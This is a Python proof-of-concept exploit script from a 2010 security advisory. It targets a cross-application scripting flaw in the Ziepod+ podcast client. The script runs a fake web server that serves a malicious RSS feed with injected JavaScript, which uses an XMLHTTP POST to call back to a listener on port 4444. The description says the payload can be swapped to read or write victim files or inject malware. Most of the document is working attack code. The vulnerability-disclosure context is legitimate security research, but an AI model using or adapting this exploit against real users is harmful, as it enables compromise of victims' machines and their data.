#!/usr/bin/python
 
import thread
import socket
 
"""
|------------------------------------------------------------------|
|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|
 
 
Ziepod+ 1.0 Cross Application Scripting
Advisory: CORELAN-10-037
Found and coded by sinn3r  -  x90.sinner{at}gmail{d0t}com
http://twitter.com/_sinn3r
 
Tested Machine:
Windows XP SP3 ENG + IE 7.0
Windows 7 Ultimate + IE 8.0
 
Description:
 
Ziepod/Ziepod+ is vulnerable to cross application scripting when processing an XML subscription.
In order to carry about the attack, the attacker must serve the malicious XML file on a web
server first and trick the user into adding it to the subscription.  Once the XML is automatically
loaded, the JavaScript will execute, the attacker is capable of any of the following depending
on the browser:
 1. Modify the application contents in Ziepod
 2. View/transfer/write data on the victim machine
 3. Inject malware on the victim machine using, for example, an iframe
 
This payload of this script is pretty harmless, it just mimics a "ping"
request using XMLHttpRequest(). When you see the "PING!", that indicates
the remote machine is vulnerable to this attack.
 
Disclosure:
04-20-2010: Vendor contacted
04-28-2010: Reminder sent
05-05-2010: Still no response from vendor, POC released.
 
Demo:
sinn3r@bt:~/sploits# ./ziepod1_0.py
[*] Ziepod+ 1.0 Cross Application Scripting
[*] coded by sinn3r  -  x90.sinner{at}gmail{d0t}com
[*] Waiting for a ping from the Ziepod user at 0.0.0.0:4444
[*] Running web server at 0.0.0.0:80
[*] Fake podcast XML sent
[*] 192.168.3.111 says "PING!"... it is vulnerable.
"""
 
## We put a null byte in front of the tag to prevent it being displayed in some areas
## the isIndex trick isn't the only way to run JavaScript, of course.
## Make sure to modify the destination address
payload = (
"%00%3cscript%3e"
"h=new ActiveXObject('Microsoft.XMLHTTP');h.open('POST', 'http://www.example.com:4444',false);h.send('PING!!');"
"%3c/script%3e");
 
## XML template
## The <description> tag isn't the only place to inject code, but you get the point
_xml = """<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dcterms="http://purl.org/dc/terms/">
  <channel>
    <title>Channel Title</title>
    <link>http://google.com/</link>
    <description>Channel Description</description>
    <language>en-us</language>
    <generator>n0body</generator>
 
    <pubDate>Sat, 17 Apr 2010 00:37:29 GMT</pubDate>
    <itunes:keywords>keyword1,keyword2</itunes:keywords>
    <itunes:subtitle>Channel subtitle.</itunes:subtitle>
    <itunes:owner>
      <itunes:name>Channel Hsowner's name</itunes:name>
      <itunes:email>Channel Is owner's email</itunes:email>
 
    </itunes:owner>
    <itunes:explicit>clean</itunes:explicit>
    <itunes:block>sno</itunes:block>
    <itunes:image href="http://google.com/image.jpg"/>
    <itunes:author>sinn3r</itunes:author>
    <itunes:summary>sinn3r is phat</itunes:summary>
    <itunes:category text="exploit">
 
      <itunes:category text="exploit"/>
    </itunes:category>
    <atom:link href="http://www.google.com/rss2.xml" type="application/rss+xml" rel="self"/>
    <item>
      <title>This is a podcast, really</title>
      <description>This is a podcast that doesn't do anything, really.%s</description>
      <guid isPermaLink="true">http://www.google.com</guid>
 
      <comments>No comment</comments>
      <pubDate>Sat, 17 Apr 2010 00:28:17 GMT</pubDate>
      <dcterms:modified>2010-17</dcterms:modified>
      <dcterms:created>2010-04-17</dcterms:created>
      <link>http://www.google.com</link>
      <dc:creator>podcast creator</dc:creator>
 
      <itunes:keywords>podcast1_keyword1</itunes:keywords>
      <enclosure url="http://www.google.com/s.mp3" type="audio/mpeg" length="3214628"/>
      <itunes:image href="http://someurl/s.jpg"/>
      <itunes:duration>267</itunes:duration>
      <itunes:explicit>clean</itunes:explicit>
      <itunes:summary>s</itunes:summary>
    </item>
  </channel>
</rss>
 
""" %payload
 
## Listen for the payload's "ping" at port 4444
def runReceiver():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    print "[*] Waiting for a ping from the Ziepod user at 0.0.0.0:4444"
    while 1:
        c, addr = s.accept()
        #print "[*] Remote user %s says:" %addr[0],
        while 1:
            data = c.recv(1024)
            if not data or data.find("PING!!") >= 0:
                print "[*] %s says \"PING!\"... it is vulnerable." %addr[0]
                break
        c.close()
 
## Fake a web server so we can serve the app with fake podcasts.
def runServer():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 80))
    s.listen(1)
    print "[*] Running web server at 0.0.0.0:80"
    while 1:
        c, addr = s.accept()
        c.send(_xml)
        print "[*] Fake podcast XML sent"
        c.close()
 
if __name__ == "__main__":
    print "[*] Ziepod+ 1.0 Cross Application Scripting"
    print "[*] coded by sinn3r  -  x90.sinner{at}gmail{d0t}com"
    thread.start_new_thread(runReceiver, ())
    runServer()